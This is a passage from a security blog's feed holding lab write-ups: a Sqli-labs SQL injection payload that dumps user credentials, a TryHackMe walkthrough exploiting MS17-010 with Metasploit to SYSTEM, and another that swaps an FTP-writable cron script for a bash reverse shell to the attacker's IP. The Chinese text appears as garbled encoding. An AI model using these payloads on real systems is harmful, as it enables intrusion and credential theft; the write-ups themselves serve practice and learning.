class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin%e4%27 union select 1,group_concat(username,0x7e,password) from users -- -</span><br></pre></td></tr></table></figure><img src="/2021/01/19/Sqli-labs-Page2-adv/image-20210119112040350.png" class>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;Sqli_labs_Page2(advance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt; &lt;strong&gt;skip:åŸºç¡€ç¯‡ç¯å¢ƒä¸ºwindowsï¼Œä½†åœ¨æé«˜ç¯‡æœ‰äº›å…³å¡ä¼šå‡ºç°è§£æé”™è¯¯ï¼Œæœ¬ç¯‡ä½¿ç”¨dockeræ­å»ºçš„Linuxç¯å¢ƒ&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/categories/Sqli-labs/"/>
    
    
    <category term="Sqli-labs" scheme="https://lunamoore.github.io/tags/Sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[blue]</title>
    <link href="https://lunamoore.github.io/2021/01/15/tryhackme-blue/"/>
    <id>https://lunamoore.github.io/2021/01/15/tryhackme-blue/</id>
    <published>2021-01-15T11:53:54.000Z</published>
    <updated>2021-01-15T11:56:55.030Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/15/tryhackme-blue/image-20210115194912000.png" class><a id="more"></a><h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>çœ‹åˆ°äº†ms17-010(æ°¸æ’ä¹‹è“)</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/blue# nmap -sC -vv --script=vuln 10.10.246.255 -oN nmap.demo</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-15 05:38 EST</span><br><span class="line">NSE: Loaded 105 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 10.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:38</span><br><span class="line">Completed NSE at 05:38, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [4 ports]</span><br><span class="line">Completed Ping Scan at 05:38, 0.30s elapsed (1 total hosts)</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 05:38</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 05:38, 0.02s elapsed</span><br><span class="line">Initiating SYN Stealth Scan at 05:38</span><br><span class="line">Scanning 10.10.246.255 [1000 ports]</span><br><span class="line">Discovered open port 445/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 3389/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 139/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 135/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49154/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49159/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49153/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49158/tcp on 10.10.246.255</span><br><span class="line">Discovered open port 49152/tcp on 10.10.246.255</span><br><span class="line">Completed SYN Stealth Scan at 05:39, 46.22s elapsed (1000 total ports)</span><br><span class="line">NSE: Script scanning 10.10.246.255.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:39</span><br><span class="line">NSE: [ssl-ccs-injection 10.10.246.255:3389] No response from server: ERROR</span><br><span class="line">NSE Timing: About 88.47% done; ETC: 05:39 (0:00:04 remaining)</span><br><span class="line">NSE Timing: About 89.08% done; ETC: 05:40 (0:00:07 remaining)</span><br><span class="line">Completed NSE at 05:40, 90.23s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Nmap scan report for 10.10.246.255</span><br><span class="line">Host is up, received echo-reply ttl 127 (0.25s latency).</span><br><span class="line">Scanned at 2021-01-15 05:38:32 EST for 136s</span><br><span class="line">Not shown: 991 closed ports</span><br><span class="line">Reason: 991 resets</span><br><span class="line">PORT      STATE SERVICE       REASON</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127</span><br><span class="line">445/tcp   open  microsoft-ds  syn-ack ttl 127</span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127</span><br><span class="line">|_ssl-ccs-injection: No reply from server (TIMEOUT)</span><br><span class="line">|_sslv2-drown: </span><br><span class="line">49152/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49153/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49154/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49158/tcp open  unknown       syn-ack ttl 127</span><br><span class="line">49159/tcp open  unknown       syn-ack ttl 127</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED</span><br><span class="line">|_smb-vuln-ms10-054: false</span><br><span class="line">|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</span><br><span class="line">| smb-vuln-ms17-010: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  CVE:CVE-2017-0143</span><br><span class="line">|     Risk factor: HIGH</span><br><span class="line">|       A critical remote code execution vulnerability exists in Microsoft SMBv1</span><br><span class="line">|        servers (ms17-010).</span><br><span class="line">|           </span><br><span class="line">|     Disclosure date: 2017-03-14</span><br><span class="line">|     References:</span><br><span class="line">|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</span><br><span class="line">|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 2) scan.</span><br><span class="line">Initiating NSE at 05:40</span><br><span class="line">Completed NSE at 05:40, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 147.23 seconds</span><br><span class="line">           Raw packets sent: 1189 (52.292KB) | Rcvd: 1066 (42.672KB)</span><br><span class="line">root@JIYE:~/tryhackme/blue#</span><br></pre></td></tr></table></figure><h2 id="0x03-MSFç›´æ¥åˆ©ç”¨"><a href="#0x03-MSFç›´æ¥åˆ©ç”¨" class="headerlink" title="0x03.MSFç›´æ¥åˆ©ç”¨"></a>0x03.MSFç›´æ¥åˆ©ç”¨</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.246.255</span><br><span class="line">rhosts =&gt; 10.10.246.255</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 10.9.248.83</span><br><span class="line">lhost =&gt; 10.9.248.83</span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS         10.10.246.255    yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST     10.9.248.83      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.9.248.83:4444 </span><br><span class="line">[*] 10.10.246.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.246.255:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.246.255:445     - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.246.255:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.246.255:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.246.255:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.246.255:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.246.255:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.246.255:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.246.255:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.246.255:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.246.255:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.246.255:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.246.255:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.246.255:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.246.255:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.246.255:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.246.255:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.246.255:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (200262 bytes) to 10.10.246.255</span><br><span class="line">[*] Meterpreter session 1 opened (10.9.248.83:4444 -&gt; 10.10.246.255:49201) at 2021-01-15 05:54:08 -0500</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.246.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-Demo&quot;&gt;&lt;a href=&quot;#0x01-Demo&quot; class=&quot;headerlink&quot; title=&quot;0x01.Demo&quot;&gt;&lt;/a&gt;0x01.Demo&lt;/h2&gt;&lt;img src=&quot;/2021/01/15/tryhackme-blue/image-20210115194912000.png&quot; class&gt;</summary>
    
    
    
    <category term="Tryhackme" scheme="https://lunamoore.github.io/categories/Tryhackme/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>tryhackme-[Anonymous]</title>
    <link href="https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/"/>
    <id>https://lunamoore.github.io/2021/01/13/tryhackme-Anonymous/</id>
    <published>2021-01-13T06:58:12.000Z</published>
    <updated>2021-01-13T07:01:13.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Demo"><a href="#0x01-Demo" class="headerlink" title="0x01.Demo"></a>0x01.Demo</h2><img src="/2021/01/13/tryhackme-Anonymous/image-20210113134507401.png" class><a id="more"></a><h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†4ä¸ªç«¯å£21/22/139/445 å…¶ä¸­ftpå¼€æ”¾äº†åŒ¿åç™»å…¥ï¼Œä¸”ç›®å½•ä¸ºscripts</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# nmap -sC -sV -sT 10.10.7.51 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-13 00:46 EST</span><br><span class="line">Nmap scan report for 10.10.7.51</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">21/tcp  open  ftp         vsftpd 2.0.8 or later</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.9.248.83</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 5</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)</span><br><span class="line">|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)</span><br><span class="line">|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1s, deviation: 2s, median: 0s</span><br><span class="line">|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)</span><br><span class="line">|   Computer name: anonymous</span><br><span class="line">|   NetBIOS computer name: ANONYMOUS\x00</span><br><span class="line">|   Domain name: \x00</span><br><span class="line">|   FQDN: anonymous</span><br><span class="line">|_  System time: 2021-01-13T05:48:13+00:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-01-13T05:48:11</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 157.83 seconds</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><p><code>æŸ¥çœ‹æœåŠ¡å…±äº«çš„èµ„æºï¼Œå‘ç°ä¸ºpics</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# smbclient -L 10.10.7.51</span><br><span class="line">Enter WORKGROUP\root&#x27;s password: </span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        pics            Disk      My SMB Share Directory for Pics</span><br><span class="line">        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x03-åŒ¿åç™»å…¥ftp"><a href="#0x03-åŒ¿åç™»å…¥ftp" class="headerlink" title="0x03.åŒ¿åç™»å…¥ftp"></a>0x03.åŒ¿åç™»å…¥ftp</h2><p><code>å‘ç°scriptsç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œå¹¶ä¸‹è½½</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# ftp 10.10.7.51</span><br><span class="line">Connected to 10.10.7.51.</span><br><span class="line">220 NamelessOne&#x27;s FTP Server!</span><br><span class="line">Name (10.10.7.51:root): anonymous</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> <span class="built_in">cd</span> scripts</span></span><br><span class="line">250 Directory successfully changed.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> ls</span></span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh</span><br><span class="line">-rw-rw-r--    1 1000     1000          946 Jan 13 05:47 removed_files.log</span><br><span class="line">-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get clean.sh</span></span><br><span class="line">local: clean.sh remote: clean.sh</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for clean.sh (314 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">314 bytes received in 0.00 secs (3.4820 MB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get removed_files.log</span></span><br><span class="line">local: removed_files.log remote: removed_files.log</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for removed_files.log (989 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">989 bytes received in 0.57 secs (1.6842 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> get to_do.txt</span></span><br><span class="line">local: to_do.txt remote: to_do.txt</span><br><span class="line">200 PORT command successful. Consider using PASV.</span><br><span class="line">150 Opening BINARY mode data connection for to_do.txt (68 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">68 bytes received in 0.60 secs (0.1115 kB/s)</span><br><span class="line"><span class="meta">ftp&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x04-æŸ¥çœ‹æ–‡ä»¶"><a href="#0x04-æŸ¥çœ‹æ–‡ä»¶" class="headerlink" title="0x04.æŸ¥çœ‹æ–‡ä»¶"></a>0x04.æŸ¥çœ‹æ–‡ä»¶</h2><p><code>å‘ç°clean.shä½œç”¨ä¸ºåˆ é™¤/tmpä¸‹çš„æ–‡ä»¶ï¼Œå¦å¤–ä¸¤ä¸ªæ–‡ä»¶æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¸œè¥¿</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">tmp_files=0</span><br><span class="line">echo $tmp_files</span><br><span class="line">if [ $tmp_files=0 ]</span><br><span class="line">then</span><br><span class="line">        echo &quot;Running cleanup script:  nothing to delete&quot; &gt;&gt; /var/ftp/scripts/removed_files.log</span><br><span class="line">else</span><br><span class="line">    for LINE in $tmp_files; do</span><br><span class="line">        rm -rf /tmp/$LINE &amp;&amp; echo &quot;$(date) | Removed file /tmp/$LINE&quot; &gt;&gt; /var/ftp/scripts/removed_files.log;done</span><br><span class="line">fi</span><br><span class="line">root@JIYE:~/tryhackme/anonymous#</span><br></pre></td></tr></table></figure><h2 id="0x05-åå¼¹shell"><a href="#0x05-åå¼¹shell" class="headerlink" title="0x05.åå¼¹shell"></a>0x05.åå¼¹shell</h2><p><code>ä¿®æ”¹clean.shå¹¶ä¸Šä¼ ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tryhackme/anonymous# cat clean.sh </span><br><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">bash -i &gt;&amp; /dev/tcp/10.9.248.83/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><span class="exturl" 